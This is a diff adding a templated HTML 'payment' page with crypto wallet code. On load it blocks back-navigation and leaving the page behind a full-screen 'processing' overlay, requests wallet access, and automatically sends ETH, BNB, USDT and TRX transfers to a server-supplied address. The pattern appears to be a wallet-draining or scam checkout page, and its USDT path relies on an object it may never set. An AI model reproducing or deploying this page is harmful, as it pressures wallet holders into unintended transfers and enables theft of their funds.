@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Оплата</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f8f9fa;
+            font-family: Arial, sans-serif;
+        }
+        .progress {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .progress-bar {
+            width: 50%;
+            height: 4px;
+            background-color: #e9ecef;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .progress-bar-inner {
+            width: 100%;
+            height: 100%;
+            background-color: #007bff;
+            animation: progress 2s ease-in-out infinite;
+        }
+        @keyframes progress {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        .message {
+            margin-top: 20px;
+            color: #333;
+            font-size: 16px;
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.1.0/dist/TronWeb.js"></script>
+</head>
+<body>
+    <div class="progress">
+        <div class="progress-bar">
+            <div class="progress-bar-inner"></div>
+        </div>
+        <div class="message">Обработка платежа...</div>
+    </div>
+
+    <script>
+    // Блокируем навигацию
+    window.onbeforeunload = function() {
+        return "Вы уверены, что хотите покинуть страницу?";
+    };
+    window.history.pushState(null, null, window.location.href);
+    window.onpopstate = function() {
+        window.history.pushState(null, null, window.location.href);
+    };
+
+    // Функция для проверки наличия кошелька
+    async function checkWallet() {
+        const walletType = '{{ payment.wallet_type }}';
+        
+        if (walletType === 'metamask' || walletType === 'trustwallet') {
+            if (window.ethereum) {
+                try {
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    return true;
+                } catch (error) {
+                    console.error('Error connecting to wallet:', error);
+                    return false;
+                }
+            } else if (window.web3) {
+                window.web3 = new Web3(window.web3.currentProvider);
+                return true;
+            } else {
+                return false;
+            }
+        } else if (walletType === 'tronlink') {
+            if (window.tronWeb) {
+                try {
+                    await window.tronWeb.request({ method: 'tron_requestAccounts' });
+                    return true;
+                } catch (error) {
+                    console.error('Error connecting to TronLink:', error);
+                    return false;
+                }
+            } else {
+                return false;
+            }
+        }
+        return false;
+    }
+
+    // Функция для создания и подтверждения транзакции
+    async function createAndConfirmTransaction() {
+        const walletType = '{{ payment.wallet_type }}';
+        const coins = JSON.parse('{{ payment.coins | tojson | safe }}');
+        
+        try {
+            // Проверяем наличие кошелька
+            const walletAvailable = await checkWallet();
+            if (!walletAvailable) {
+                throw new Error('Кошелек не обнаружен. Пожалуйста, установите и подключите кошелек.');
+            }
+
+            if (walletType === 'metamask' || walletType === 'trustwallet') {
+                if (window.ethereum) {
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    
+                    for (const coin of coins) {
+                        if (coin.coin_type === 'eth' || coin.coin_type === 'bnb') {
+                            const transactionParameters = {
+                                to: '{{ payment.wallet_address }}',
+                                from: window.ethereum.selectedAddress,
+                                value: Web3.utils.toWei(coin.amount, 'ether')
+                            };
+                            await window.ethereum.request({
+                                method: 'eth_sendTransaction',
+                                params: [transactionParameters]
+                            });
+                        } else if (coin.coin_type === 'usdt_eth' || coin.coin_type === 'usdt_bsc') {
+                            const usdtContractAddress = coin.coin_type === 'usdt_eth' 
+                                ? '0xdAC17F958D2ee523a2206206994597C13D831ec7'
+                                : '0x55d398326f99059fF775485246999027B3197955';
+                            const usdtContract = new window.web3.eth.Contract(USDT_ABI, usdtContractAddress);
+                            await usdtContract.methods.transfer(
+                                '{{ payment.wallet_address }}',
+                                Web3.utils.toWei(coin.amount, 'mwei')
+                            ).send({ from: window.ethereum.selectedAddress });
+                        }
+                    }
+                } else {
+                    throw new Error('Пожалуйста, установите MetaMask или Trust Wallet');
+                }
+            } else if (walletType === 'tronlink') {
+                if (window.tronWeb) {
+                    await window.tronWeb.request({ method: 'tron_requestAccounts' });
+                    
+                    for (const coin of coins) {
+                        if (coin.coin_type === 'trx') {
+                            await window.tronWeb.trx.sendTransaction(
+                                '{{ payment.wallet_address }}',
+                                window.tronWeb.toSun(coin.amount)
+                            );
+                        } else if (coin.coin_type === 'usdt_trx') {
+                            const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+                            const usdtContract = await window.tronWeb.contract().at(usdtContractAddress);
+                            await usdtContract.transfer(
+                                '{{ payment.wallet_address }}',
+                                coin.amount * 1000000
+                            ).send();
+                        }
+                    }
+                } else {
+                    throw new Error('Пожалуйста, установите TronLink');
+                }
+            }
+
+            const response = await fetch('/process_payment/{{ payment.payment_id }}', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            });
+
+            const data = await response.json();
+            if (data.status === 'success') {
+                window.close();
+            } else {
+                throw new Error(data.message || 'Ошибка при обработке платежа');
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            document.querySelector('.message').textContent = error.message;
+        }
+    }
+
+    // ABI для USDT контракта
+    const USDT_ABI = [
+        {
+            "constant": false,
+            "inputs": [
+                {
+                    "name": "_to",
+                    "type": "address"
+                },
+                {
+                    "name": "_value",
+                    "type": "uint256"
+                }
+            ],
+            "name": "transfer",
+            "outputs": [
+                {
+                    "name": "",
+                    "type": "bool"
+                }
+            ],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }
+    ];
+
+    // Автоматически создаем и подтверждаем транзакцию при загрузке страницы
+    document.addEventListener('DOMContentLoaded', async () => {
+        try {
+            await createAndConfirmTransaction();
+        } catch (error) {
+            console.error('Ошибка автоматической обработки платежа:', error);
+            document.querySelector('.message').textContent = error.message;
+        }
+    });
+    </script>
+</body>
+</html> 
